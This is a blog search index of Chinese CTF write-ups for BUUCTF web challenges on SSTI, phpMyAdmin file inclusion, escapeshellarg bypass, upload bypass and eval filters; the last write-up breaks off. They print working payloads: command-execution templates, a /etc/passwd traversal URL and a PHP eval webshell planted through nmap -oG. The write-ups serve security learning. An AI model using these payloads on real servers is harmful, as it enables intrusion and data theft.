<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BJDCTF2020 The mystery of ip</title>
    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
<h1 id="解题">解题</h1>
<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
<p>发现是 <code>smarty</code>。</p>
<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
<p>成功get。</p>
<h1 id="总结">总结</h1>
<ul>
<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 我有一个数据库</title>
    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
<p>因此，决定扫描目录，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
<h1 id="解题">解题</h1>
<p>通过该页面发现：</p>
<ol type="1">
<li><p>phpmyadmin 版本为 4.8.1</p></li>
<li><p>服务器用的是 apache</p></li>
<li><p>数据库是 mysql</p></li>
<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
<li><p>系统为 Ubuntu</p></li>
</ol>
<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
<p>得到 flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>phpmyadmin 漏洞</tag>
        <tag>CVE-2018-12613</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 2018 Online Tool</title>
    <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123; </span><br><span class="line">	<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; </span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">	<span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;  </span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>); </span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);  </span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></p>
<p>从上面可以看出以下几点： - 以GET方式传入 <code>host</code>； - <code>host</code> 要经过 <code>escapeshellarg</code>，<code>escapeshellcmd</code> 两个函数。但是对这两个函数现在一无所知； - <code>sandbox</code> 就是路径地址； - <code>system</code> 函数说明本题应该是命令执行；</p>
<p>现在最大的问题就是第二点的两个函数的作用。</p>
<h1 id="escapeshellarg和escapeshellcmd作用">escapeshellarg和escapeshellcmd作用</h1>
<h2 id="escapeshellarg函数">escapeshellarg函数</h2>
<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellarg ( <span class="keyword">string</span> <span class="variable">$arg</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>作用： 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。</p>
<p>看解释可能不明白什么意思，接下来看一个例子。</p>
<p>脚本如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>可以看到 <code>escapeshellarg</code> 会在所有单引号前添加转义符号，变成 <code>\'</code> 然后在这两个字符外阔上单引号<code>'\''</code>。因此，上述例子中会将原来的 <code>'</code> 变成 <code>'\''</code>，然后在整个字符串外面添加单引号。回过头看 <strong>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</strong> 就很明确了。</p>
<h2 id="escapeshellcmd函数">escapeshellcmd函数</h2>
<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellcmd(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>作用： escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者执行操作符之前进行转义。反斜线（）会在以下字符之前插入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;  #  ; `  |  *  ?  ~  &lt;  &gt;  ^  (  )  [  ]  &#123;  &#125;  $  \, \x0A  \xFF</span><br></pre></td></tr></table></figure> <code>'</code>和 <code>"</code> 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
<p>看一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host2</span> = escapeshellcmd(<span class="variable">$host1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br><span class="line">&#x27;\&lt;\?php phpinfo\(&#x27;\\&#x27;&#x27;x&#x27;\\&#x27;&#x27;\)\;\?\&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>可以看到它在众多符号面前都添加了转移符号 <code>\</code> 。</p>
<h2 id="两者一起用的漏洞">两者一起用的漏洞</h2>
<p>例子来源于：<a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
<ol type="1">
<li>假设传入的参数是：<code>172.17.0.2' -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>'172.17.0.2'\'' -v -d a=1'</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>'172.17.0.2'\\'' -v -d a=1\'</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对</strong>的引号进行了转义。</li>
<li>最后执行的命令是<code>curl '172.17.0.2'\\'' -v -d a=1\'</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>'</code>没有被转义，与再后面的<code>'</code>配对成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1'</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1'</code>。</li>
</ol>
<p>总而言之：</p>
<ul>
<li>escapeshellarg
<ul>
<li>确保用户只传递一个参数（在整个外面添加单引号，使字符串成为一个整体）</li>
<li>用户不能指定更多的参数</li>
<li>用户不能执行不同的命令（一般 <code>127.0.0.1;ls</code>，在外面添加单引号使 <code>;</code> 与前后文变成整体，因此无法实现执行多条命令）</li>
</ul></li>
<li>escapeshellcmd
<ul>
<li>确保用户只执行一个命令（会在落单的引号前添加转义字符使其失去闭合前面引号的作用）</li>
<li>用户可以指定不限量的参数</li>
<li>用户不能执行不同的命令（<code>;  $  |</code> 等符号都会被添加转义字符使其失去功能，变成字符本身）</li>
</ul></li>
</ul>
<h1 id="解题">解题</h1>
<p>本题其实还涉及 nmap 的参数，nmap 可以用 <code>-oG</code> 将执行结果写入文件。</p>
<p>语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap [任意内容] -oG fileName</span><br></pre></td></tr></table></figure></p>
<p>接下来就是细节方面的讨论了。就是如何绕过前面所说的两个函数。我们需要写入文件的肯定是一句话木马，因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这样子 <code>-oG</code> 与上下文变成一个整体，无法被当作参数执行。因此需要把单引号去掉，只要最前面添加单引号就可以把后面释放出来。修改后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>由于 <code>\\</code> 使后者不作为转移符号，因此第三个单引号还能起作用，与第四个单引号成对，单引号内容为空，可以去掉： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>于是 <code>oG</code> 可以被成功执行，但是此时前面的木马写入的文件的名字为 <code>shell.php'</code> 。（<strong>我由于已经做完了，下面蚁剑连接只是作为证明，以便理解</strong>） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191734.png" /></p>
<p>内容为： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191747.png" /> （<code>\\</code> 使后者失去转义功能，仅仅作为 <code>\</code>，因此木马最前面有一个 <code>\</code>）</p>
<p>不是 <code>php</code> 文件，无法连接。接下需要把后面的单引号也要去掉，因此在后面也添加单引号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注意，前面的 <code>''\\''</code> 因为前面的两个单引号成对，因此 <code>\\</code> 不被单引号包括，也就是不是字符串；而后者 <code>'\\'''</code>中<code>\\</code>被单引号包括，因此前一个转义字符不执行转义字符，而是被当作普通的字符。</p>
</blockquote>
<p>因此最后生成的文件名为 <code>shell.php\\</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192825.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192834.png" /></p>
<p>解决办法也很简单，那就是加一个空格就好： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php &#x27;</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>此时相当于把 <strong>木马</strong> 和 <code>\\</code> 一起写入了文件。路径如下，注意别把 <code>Starting</code> 也当作路径。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322193312.png" /></p>
<p>用蚁剑连接即可。flag在根目录。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>PHP</tag>
        <tag>nmap命令</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 BabyUpload</title>
    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
<h1 id="过滤测试">过滤测试</h1>
<h2 id="过滤类型测试">过滤类型测试</h2>
<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
<h2 id="过滤后缀测试">过滤后缀测试</h2>
<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
<h2 id="文件内容过滤">文件内容过滤</h2>
<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
<p>成功。</p>
<h1 id="总结">总结</h1>
<ol type="1">
<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
<li>文件内容的过滤，需要知道多种木马的写法。</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 禁止套娃</title>
    <url>/2022/03/24/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后发现什么信息都没有，数据包和源码都没有有用的信息。因此尝试扫描目录。但是我没有扫描出什么结果，可能是脚本不够强大吧。所以我又则疼了一会终于百度了以下，发现存在 <code>git</code> 泄露，因此使用 <code>githack</code> 下载。下载得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="解题">解题</h1>
<p>第一个 <code>if</code> 过滤了一些伪协议；</p>
<p>第二个 <code>if</code> 比较难，第一次遇见，这是过滤了函数的参数。<code>?(R)?</code> 是递归匹配模式的意思。匹配到的字符串都会被空代替，最后还需要满足强对比。所以，我们传入的exp在最后得有 <code>;</code> ，并且前面的部分都要被匹配，从而只剩下 <code>;</code>。</p>
<p>详细解释一下第二个匹配模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-z,_]+\((?R)?\)可以分为以下4个部分：</span><br><span class="line">1. [a-z,_]  </span><br><span class="line">2. \(   </span><br><span class="line">3. (?R)?   </span><br><span class="line">4. \)</span><br></pre></td></tr></table></figure>
<p>假设输入的为 <code>print_r(scandir());</code>。这句话就是扫描某目录（此时目录并未指定），然后把目录下的所有文件名or子目录名形成一个数组返回并打印出来。</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">过程</th>
<th style="text-align: center;">被匹配的部分</th>
<th style="text-align: center;">备注</th>
<th style="text-align: center;">递归层数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">print_r</td>
<td style="text-align: center;"><code>[a-z,_]</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;">print_r(</td>
<td style="text-align: center;"><code>\(</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td style="text-align: center;">print_r(scandir</td>
<td style="text-align: center;"><code>(?R)?</code> 起作用，进入递归，再次匹配<code>[a-z,_]</code></td>
<td style="text-align: center;">1</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;">print_r(scandir(</td>
<td style="text-align: center;"><code>\(</code> 再次起作用</td>
<td style="text-align: center;">1</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td style="text-align: center;">print_r(scandir()</td>
<td style="text-align: center;">进入第一个递归之后的 <code>\)</code> 起作用<br>执行之后退出第一次递归</td>
<td style="text-align: center;">执行时属于：1<br>执行结束后退出第一层递归：0</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td style="text-align: center;">print_r(scandir())</td>
<td style="text-align: center;"><code>\)</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
</tbody>
</table>
<p>最后剩下一个 <code>;</code> 成功匹配。如果带有参数，比如：<code>print_r(scandir('/'));</code>，到第4步为止都是一样的，第5步的时候因为此时应该匹配的是 <code>\)</code> ，但是，此时字符串的位置是 <code>'/')</code> 无法成功匹配，返回原来的字符串，从而无法绕过第二个 <code>if</code>。</p>
<p>成功绕过演示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200901.png" /></p>
<p>失败演示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200923.png" /></p>
<p>第三个 <code>if</code> 也比较简单，只是过滤了一些敏感词。</p>
<p>接下来就要做两件事：</p>
<ol type="1">
<li><p>找 flag 所在的路径，一般在当前目录或者根目录</p></li>
<li><p>找到了该怎么把路径表示出来，此时不能传入参数</p></li>
</ol>
<p>接下来需要对 PHP 比较了解的人能够想得到（反正我个菜鸟没有想到），先介绍几个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. localeconv(): 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="number">2</span>. scandir(): 列出给定目录中的文件和目录。</span><br><span class="line"><span class="number">3</span>. readfile(): 输出一个文件。本题中，如果使用该函数输出flag，需要在源码中查看</span><br><span class="line"><span class="number">4</span>. current(): 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="number">5</span>. pos(): current() 的别名。</span><br><span class="line"><span class="number">6</span>. next(): 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="number">7</span>. array_reverse(): 以相反的元素顺序返回数组。</span><br><span class="line"><span class="number">8</span>. highlight_file(): 打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line"><span class="number">9</span>. array_flip(): 将数组的键和值互换</span><br><span class="line"><span class="number">10</span>. array_rand(): 随机读取数组中的一个或多个单元</span><br></pre></td></tr></table></figure>
